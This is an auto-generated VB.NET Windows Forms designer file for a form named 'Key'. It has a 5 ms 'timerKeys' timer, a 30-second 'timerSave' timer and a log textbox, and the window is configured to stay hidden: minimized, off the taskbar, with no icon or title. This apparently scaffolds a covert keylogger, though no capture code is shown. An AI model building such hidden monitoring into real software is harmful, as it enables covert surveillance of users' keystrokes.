<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
Partial Class Key
    Inherits System.Windows.Forms.Form

    'Форма переопределяет dispose для очистки списка компонентов.
    <System.Diagnostics.DebuggerNonUserCode()> _
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Является обязательной для конструктора форм Windows Forms
    Private components As System.ComponentModel.IContainer

    'Примечание: следующая процедура является обязательной для конструктора форм Windows Forms
    'Для ее изменения используйте конструктор форм Windows Form.  
    'Не изменяйте ее в редакторе исходного кода.
    <System.Diagnostics.DebuggerStepThrough()> _
    Private Sub InitializeComponent()
        Me.components = New System.ComponentModel.Container()
        Me.timerKeys = New System.Windows.Forms.Timer(Me.components)
        Me.timerSave = New System.Windows.Forms.Timer(Me.components)
        Me.tbLog = New System.Windows.Forms.TextBox()
        Me.SuspendLayout()
        '
        'timerKeys
        '
        Me.timerKeys.Enabled = True
        Me.timerKeys.Interval = 5
        '
        'timerSave
        '
        Me.timerSave.Enabled = True
        Me.timerSave.Interval = 30000
        '
        'tbLog
        '
        Me.tbLog.Location = New System.Drawing.Point(0, 0)
        Me.tbLog.Name = "tbLog"
        Me.tbLog.Size = New System.Drawing.Size(100, 20)
        Me.tbLog.TabIndex = 0
        '
        'Key
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.BackColor = System.Drawing.SystemColors.Desktop
        Me.CausesValidation = False
        Me.ClientSize = New System.Drawing.Size(246, 47)
        Me.ControlBox = False
        Me.Controls.Add(Me.tbLog)
        Me.Enabled = False
        Me.MaximizeBox = False
        Me.MinimizeBox = False
        Me.Name = "Key"
        Me.ShowIcon = False
        Me.ShowInTaskbar = False
        Me.Text = " "
        Me.WindowState = System.Windows.Forms.FormWindowState.Minimized
        Me.ResumeLayout(False)
        Me.PerformLayout()

    End Sub
    Friend WithEvents timerKeys As System.Windows.Forms.Timer
    Friend WithEvents timerSave As System.Windows.Forms.Timer
    Friend WithEvents tbLog As System.Windows.Forms.TextBox

End Class
